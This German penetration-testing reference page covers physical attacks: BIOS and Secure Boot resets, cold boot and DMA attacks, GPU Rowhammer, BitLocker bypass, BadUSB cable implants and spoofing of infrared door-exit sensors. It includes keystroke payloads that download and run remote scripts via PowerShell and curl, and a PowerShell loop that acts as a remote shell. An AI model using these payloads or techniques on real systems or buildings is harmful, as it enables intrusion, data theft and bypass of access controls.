# Physische Angriffe

{{#include ../banners/hacktricks-training.md}}

## Wiederherstellung von BIOS-Passwörtern und Systemsicherheit

Das **Zurücksetzen des BIOS** kann auf verschiedene Weise erfolgen. Die meisten Motherboards enthalten eine **Batterie**, deren Entfernung für etwa **30 Minuten** die BIOS-Einstellungen einschließlich des Passworts zurücksetzt. Alternativ kann ein **Jumper auf dem Motherboard** angepasst werden, um diese Einstellungen durch das Verbinden bestimmter Pins zurückzusetzen.

Wenn Hardware-Anpassungen nicht möglich oder praktikabel sind, bieten **Softwaretools** eine Lösung. Das Starten eines Systems von einer **Live CD/USB** mit Distributionen wie **Kali Linux** ermöglicht den Zugriff auf Tools wie **_killCmos_** und **_CmosPWD_**, die bei der Wiederherstellung des BIOS-Passworts helfen können.

Wenn das BIOS-Passwort unbekannt ist, führt die dreimalige falsche Eingabe normalerweise zu einem Fehlercode. Dieser Code kann auf Websites wie [https://bios-pw.org](https://bios-pw.org) verwendet werden, um möglicherweise ein verwendbares Passwort abzurufen.

### UEFI-Sicherheit

Für moderne Systeme, die anstelle des traditionellen BIOS **UEFI** verwenden, kann das Tool **chipsec** eingesetzt werden, um UEFI-Einstellungen zu analysieren und zu ändern, einschließlich der Deaktivierung von **Secure Boot**. Dies kann mit dem folgenden Befehl erreicht werden:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM-Analyse und Cold Boot Attacks

RAM behält Daten nach dem Abschalten der Stromversorgung kurzzeitig bei, normalerweise für **1 bis 2 Minuten**. Diese Persistenz kann durch die Anwendung kalter Substanzen wie flüssigem Stickstoff auf **10 Minuten** verlängert werden. Während dieses verlängerten Zeitraums kann mit Tools wie **dd.exe** und **volatility** ein **memory dump** zur Analyse erstellt werden.

---

## GPU Rowhammer gegen Seitentabellen

Moderne GPU Rowhammer-Angriffe werden wesentlich nützlicher, wenn sie auf **GPU virtual-memory metadata** statt auf gewöhnliche Buffer abzielen. Neuere Arbeiten zu **GDDR6 NVIDIA Ampere GPUs** zeigen, dass ein Angreifer, der nicht privilegierten CUDA-Code ausführt, GPU-spezifische Hammering-Muster erstellen, mit **memory massaging** Paging-Strukturen in anfälligen Zeilen platzieren und anschließend Bits in der **last-level page table** oder einem übergeordneten **page directory** flippen kann. Sobald ein einzelner Translation-Eintrag beschädigt wurde, kann der Angreifer **arbitrary GPU memory read/write** ermöglichen und anschließend auf eine Kompromittierung des Hosts übergehen.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Hammerbare Zeilen profilieren** in GDDR6 und refresh-bewusste / nicht uniforme Hammering-Muster erstellen, die In-DRAM-Mitigations umgehen.
2. **GPU-Allokationen massieren**, damit der Treiber Page-Translation-Strukturen an hammerbaren physischen Stellen platziert, anstatt sie im standardmäßig geschützten Pool zu belassen. In der Praxis kann dies bedeuten, die Low-Memory-Page-Table-Region zu erschöpfen und große, sparse UVM-Mappings mit kontrollierten Strides zu sprühen.
3. **Translation-Metadaten flippen**, etwa **PFN** oder aperture-bezogene Bits innerhalb eines Page-Table- / Page-Directory-Eintrags, sodass die vom Angreifer kontrollierte virtuelle Seite zu Page-Table-Seiten, beliebigem GPU-Speicher oder für den Host sichtbaren System-Mappings aufgelöst wird.
4. Das gefälschte Mapping wiederverwenden, um zusätzliche Translation-Einträge umzuschreiben und zu **arbitrary GPU memory read/write** über mehrere GPU-Kontexte hinweg zu eskalieren.

### Host Pivot und Mitigations

- Bei **deaktiviertem IOMMU** können gefälschte System-Aperture-Mappings beliebigen **physischen Host-Speicher** für die GPU offenlegen und das GPU-Primitive in eine vollständige Kompromittierung des Hosts verwandeln.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** zielt auf Last-Level-Page-Table-Einträge ab, während **GeForge** zeigt, dass die Beschädigung einer Page-Directory-Ebene einfacher sein kann, da ein einzelner Bit-Flip einen größeren Translation-Teilbaum neu ausrichten kann. Behandle daher nicht nur eine Paging-Ebene als sicherheitskritisch.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bleibt relevant, da es den direkten Pfad zu beliebigem Host-Speicher blockiert, der von GDDRHammer/GeForge verwendet wird, aber es ist **keine vollständige Mitigation**. **GPUBreach** zeigt einen Pivot in einer zweiten Phase, bei dem der Angreifer vom GPU beschreibbare, treibereigene CPU-Buffer beschädigt und anschließend NVIDIA-Treiber-Memory-Safety-Bugs auslöst, um ein Kernel-Write-Primitive und eine **root shell** zu erlangen, selbst wenn IOMMU aktiviert ist.<sup>[[3]](#references)</sup>
- **System-level ECC** ist ein praktischer Hardening-Schritt auf unterstützten Workstation-/Server-GPUs. Consumer-GPUs ohne ECC bieten eine schwächere Abwehrfläche.<sup>[[4]](#references)</sup>
- Diese Angriffe sind nicht rein theoretisch: **GeForge** meldete **1.171** Bit-Flips auf einer RTX 3060 und **202** auf einer RTX A6000, was ausreichte, um eine funktionierende Host-Privilege-Escalation-Kette aufzubauen.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** ist ein Tool für **physical memory manipulation** über DMA und mit Schnittstellen wie **FireWire** und **Thunderbolt** kompatibel. Es ermöglicht die Umgehung von Login-Verfahren, indem der Speicher so gepatcht wird, dass jedes Passwort akzeptiert wird. Gegen **Windows 10**-Systeme ist es jedoch unwirksam.

---

## Live CD/USB für Systemzugriff

Das Ersetzen von System-Binaries wie **_sethc.exe_** oder **_Utilman.exe_** durch eine Kopie von **_cmd.exe_** kann eine Command Prompt mit Systemrechten bereitstellen. Tools wie **chntpw** können verwendet werden, um die **SAM**-Datei einer Windows-Installation zu bearbeiten und dadurch Passwörter zu ändern.

**Kon-Boot** ist ein Tool, das die Anmeldung bei Windows-Systemen ohne Kenntnis des Passworts ermöglicht, indem es den Windows-Kernel oder die UEFI vorübergehend modifiziert. Weitere Informationen finden sich unter [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Umgang mit Windows-Sicherheitsfunktionen

### Boot- und Recovery-Shortcuts

- **Supr**: Zugriff auf die BIOS-Einstellungen.
- **F8**: Recovery-Modus öffnen.
- Das Drücken von **Shift** nach dem Windows-Banner kann Autologon umgehen.

### BAD USB Devices

Geräte wie **Rubber Ducky** und **Teensyduino** dienen als Plattformen zum Erstellen von **bad USB**-Geräten, die beim Anschließen an einen Zielcomputer vordefinierte Payloads ausführen können.

### Volume Shadow Copy

Administratorrechte ermöglichen über PowerShell das Erstellen von Kopien sensibler Dateien, einschließlich der **SAM**-Datei.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3-basierte Implants wie **Evil Crow Cable Wind** sind in USB-A→USB-C- oder USB-C↔USB-C-Kabeln verborgen, treten ausschließlich als USB-Tastatur auf und stellen ihren C2-Stack über Wi-Fi bereit. Der Operator muss das Kabel lediglich über den Opfer-Host mit Strom versorgen, einen Hotspot namens `Evil Crow Cable Wind` mit dem Passwort `123456789` erstellen und [http://cable-wind.local/](http://cable-wind.local/) (oder dessen DHCP-Adresse) aufrufen, um die eingebettete HTTP-Schnittstelle zu erreichen.<sup>[[8]](#references)</sup>
- Die Browser-UI bietet Tabs für *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* und *Config*. Gespeicherte Payloads werden nach Betriebssystem markiert, Tastaturlayouts werden dynamisch gewechselt und VID/PID-Strings können geändert werden, um bekannte Peripheriegeräte nachzuahmen.
- Da sich der C2 im Kabel befindet, kann ein Telefon Payloads bereitstellen, ihre Ausführung auslösen und Wi-Fi-Zugangsdaten verwalten, ohne das Host-Betriebssystem zu berühren – ideal für physische Intrusionen mit kurzer Verweildauer.

### OS-aware AutoExec payloads

- AutoExec-Regeln binden eine oder mehrere Payloads, die unmittelbar nach der USB-Enumeration ausgeführt werden. Das Implant führt eine einfache OS-Fingerprinting durch und wählt das passende Skript aus.
- Beispiel-Workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) oder `CTRL ALT T` (Terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Da die Ausführung unbeaufsichtigt erfolgt, kann bereits das Austauschen eines Ladekabels einen „plug-and-pwn“-Initialzugriff im Kontext des angemeldeten Benutzers ermöglichen.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Eine gespeicherte Payload öffnet eine Konsole und fügt eine Schleife ein, die alles ausführt, was auf dem neuen USB-Serial-Gerät eintrifft. Eine minimale Windows-Variante lautet:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Das Implantat hält den USB-CDC-Kanal offen, während sein ESP32-S3 einen TCP-Client (Python-Skript, Android-APK oder Desktop-Executable) zurück zum Operator startet. Alle in die TCP-Session eingegebenen Bytes werden in die obige serielle Verbindung weitergeleitet, wodurch auch auf air-gapped Hosts eine Remote Command Execution möglich ist. Die Ausgabe ist eingeschränkt, daher führen Operatoren typischerweise Blindbefehle aus (Erstellen von Accounts, Staging zusätzlicher Tools usw.).

### HTTP-OTA-Update-Oberfläche

- Derselbe Web-Stack stellt normalerweise nicht authentifizierte Firmware-Updates bereit. Evil Crow Cable Wind lauscht auf `/update` und flasht jede hochgeladene Binärdatei:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can Features während eines Einsatzes hot-swappen (z. B. die Firmware des flash USB Army Knife flashen), ohne das Kabel zu öffnen. Dadurch kann das Implantat zu neuen Fähigkeiten wechseln, während es weiterhin mit dem Zielhost verbunden ist.

## Umgehen der BitLocker-Verschlüsselung

Die BitLocker-Verschlüsselung kann möglicherweise umgangen werden, wenn das **Wiederherstellungspasswort** in einer Speicherabbilddatei (**MEMORY.DMP**) gefunden wird. Dafür können Tools wie **Elcomsoft Forensic Disk Decryptor** oder **Passware Kit Forensic** verwendet werden.

---

## Social Engineering zum Hinzufügen eines Wiederherstellungsschlüssels

Ein neuer BitLocker-Wiederherstellungsschlüssel kann durch Social-Engineering-Taktiken hinzugefügt werden, indem ein Benutzer dazu gebracht wird, einen Befehl auszuführen, der einen neuen, aus Nullen bestehenden Wiederherstellungsschlüssel hinzufügt und dadurch den Entschlüsselungsprozess vereinfacht.

---

## Ausnutzen von Gehäuseöffnungs-/Wartungsschaltern zum Zurücksetzen des BIOS auf die Werkseinstellungen

Viele moderne Laptops und Desktop-Computer im Small-Form-Factor-Format verfügen über einen **Gehäuseöffnungs-Schalter**, der vom Embedded Controller (EC) und der BIOS/UEFI-Firmware überwacht wird. Der primäre Zweck des Schalters besteht zwar darin, beim Öffnen eines Geräts einen Alarm auszulösen, doch implementieren Hersteller gelegentlich eine **undokumentierte Wiederherstellungsabkürzung**, die ausgelöst wird, wenn der Schalter in einem bestimmten Muster betätigt wird.<sup>[[5]](#references)[[6]](#references)</sup>

### Funktionsweise des Angriffs

1. Der Schalter ist mit einem **GPIO-Interrupt** des EC verbunden.
2. Die auf dem EC ausgeführte Firmware verfolgt die **Zeitabstände und Anzahl der Betätigungen**.
3. Wenn ein fest codiertes Muster erkannt wird, ruft der EC eine *mainboard-reset*-Routine auf, die **den Inhalt des System-NVRAM/CMOS löscht**.
4. Beim nächsten Booten lädt das BIOS die Standardwerte – **Supervisor-Passwort, Secure-Boot-Schlüssel und alle benutzerdefinierten Konfigurationen werden gelöscht**.

> Sobald Secure Boot deaktiviert und das Firmware-Passwort entfernt wurde, kann der Angreifer einfach ein beliebiges externes OS-Image booten und uneingeschränkten Zugriff auf die internen Laufwerke erlangen.

### Beispiel aus der Praxis – Framework 13 Laptop

Die Wiederherstellungsabkürzung für das Framework 13 (11./12./13. Generation) lautet:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Nach dem zehnten Zyklus setzt der EC ein Flag, das das BIOS anweist, den NVRAM beim nächsten Reboot zu löschen. Der gesamte Vorgang dauert etwa 40 s und erfordert **nichts außer einem Schraubendreher**.<sup>[[5]](#references)</sup>

### Allgemeines Exploitation-Verfahren

1. Das Ziel einschalten oder in den Suspend-Modus versetzen und fortsetzen, damit der EC läuft.
2. Die untere Abdeckung entfernen, um den Intrusion-/Maintenance-Schalter freizulegen.
3. Das anbieterspezifische Umschaltmuster reproduzieren (Dokumentation oder Foren konsultieren oder die EC-Firmware reverse-engineeren).
4. Das Gerät wieder zusammenbauen und rebooten – die Firmware-Schutzmechanismen sollten deaktiviert sein.
5. Einen Live-USB-Stick booten (z. B. Kali Linux) und die üblichen Post-Exploitation-Schritte durchführen (Credentials dumpen, Daten exfiltrieren, bösartige EFI-Binaries einschleusen usw.).

### Erkennung & Gegenmaßnahmen

* Chassis-Intrusion-Ereignisse in der OS-Managementkonsole protokollieren und mit unerwarteten BIOS-Resets korrelieren.
* **Manipulationssichere Siegel** an Schrauben/Abdeckungen verwenden, um ein Öffnen zu erkennen.
* Geräte in **physisch kontrollierten Bereichen** aufbewahren; davon ausgehen, dass physischer Zugriff einer vollständigen Kompromittierung gleichkommt.
* Falls verfügbar, die Funktion „Maintenance-Switch-Reset“ des Anbieters deaktivieren oder eine zusätzliche kryptografische Autorisierung für NVRAM-Resets verlangen.

---

## Verdeckte IR Injection gegen No-Touch-Exit-Sensoren

### Sensoreigenschaften
- Handelsübliche „Wave-to-Exit“-Sensoren kombinieren einen Nah-IR-LED-Emitter mit einem Empfängermodul im Stil einer TV-Fernbedienung, das erst dann Logic High meldet, wenn es mehrere Pulse (~4–10) des korrekten Trägers (≈30 kHz) erkannt hat.<sup>[[7]](#references)</sup>
- Eine Kunststoffblende verhindert, dass Emitter und Empfänger direkt aufeinander blicken. Daher nimmt der Controller an, dass jeder validierte Träger von einer nahe gelegenen Reflexion stammt, und steuert ein Relais an, das den Türöffner freigibt.
- Sobald der Controller glaubt, dass ein Ziel vorhanden ist, ändert er häufig die ausgehende Modulationshüllkurve, aber der Empfänger akzeptiert weiterhin jeden Burst, der zum gefilterten Träger passt.

### Attack-Workflow
1. **Emissionsprofil erfassen** – einen Logic Analyzer an die Controller-Pins anschließen, um sowohl die Wellenformen vor der Erkennung als auch die Wellenformen nach der Erkennung aufzuzeichnen, die die interne IR-LED ansteuern.
2. **Nur die „Post-Detection“-Wellenform wiedergeben** – den serienmäßigen Emitter entfernen/ignorieren und eine externe IR-LED von Anfang an mit dem bereits ausgelösten Muster ansteuern. Da der Empfänger nur Pulsanzahl und Frequenz berücksichtigt, behandelt er den gespooften Träger als echte Reflexion und setzt die Relaisleitung.
3. **Die Übertragung takten** – den Träger in abgestimmten Bursts übertragen (z. B. einige Dutzend Millisekunden ein, ähnlich lange aus), um die minimale Pulsanzahl zu liefern, ohne die AGC oder die Logik zur Interferenzbehandlung des Empfängers zu übersteuern. Eine kontinuierliche Emission macht den Sensor schnell unempfindlich und verhindert, dass das Relais auslöst.

### Reflektive Injection über große Entfernung
- Das Ersetzen der Labor-LED durch eine leistungsstarke IR-Diode, einen MOSFET-Treiber und Fokussieroptik ermöglicht eine zuverlässige Auslösung aus etwa 6 m Entfernung.
- Der Angreifer benötigt keine direkte Sichtverbindung zur Empfängeröffnung. Wenn der Strahl auf Innenwände, Regale oder Türrahmen gerichtet wird, die durch Glas sichtbar sind, kann die reflektierte Energie in das Sichtfeld von etwa 30° eintreten und eine Handbewegung aus kurzer Entfernung imitieren.
- Da die Empfänger nur schwache Reflexionen erwarten, kann ein deutlich stärkerer externer Strahl von mehreren Oberflächen reflektiert werden und dennoch oberhalb der Erkennungsschwelle bleiben.

### Weaponised Attack Torch
- Wenn der Treiber in eine handelsübliche Taschenlampe eingebaut wird, bleibt das Tool unauffällig. Die sichtbare LED gegen eine leistungsstarke IR-LED austauschen, die auf das Band des Empfängers abgestimmt ist, einen ATtiny412 (oder ähnlichen Mikrocontroller) zur Erzeugung der ≈30-kHz-Bursts hinzufügen und einen MOSFET zum Senken des LED-Stroms verwenden.
- Eine teleskopische Zoomlinse bündelt den Strahl für Reichweite und Präzision, während ein Vibrationsmotor unter MCU-Steuerung eine haptische Bestätigung liefert, dass die Modulation aktiv ist, ohne sichtbares Licht auszusenden.
- Das Durchlaufen mehrerer gespeicherter Modulationsmuster (mit leicht unterschiedlichen Trägerfrequenzen und Hüllkurven) erhöht die Kompatibilität mit verschiedenen umbenannten Sensorfamilien. Dadurch kann der Operator reflektierende Oberflächen absuchen, bis das Relais hörbar klickt und die Tür freigibt.

---

## Referenzen

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Sicherheitsmitteilung: Rowhammer - Juli 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Press here to pwn“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard-Reset-Anleitung](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Plug, Play, Pwn: Hacking with Evil Crow Cable Wind“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
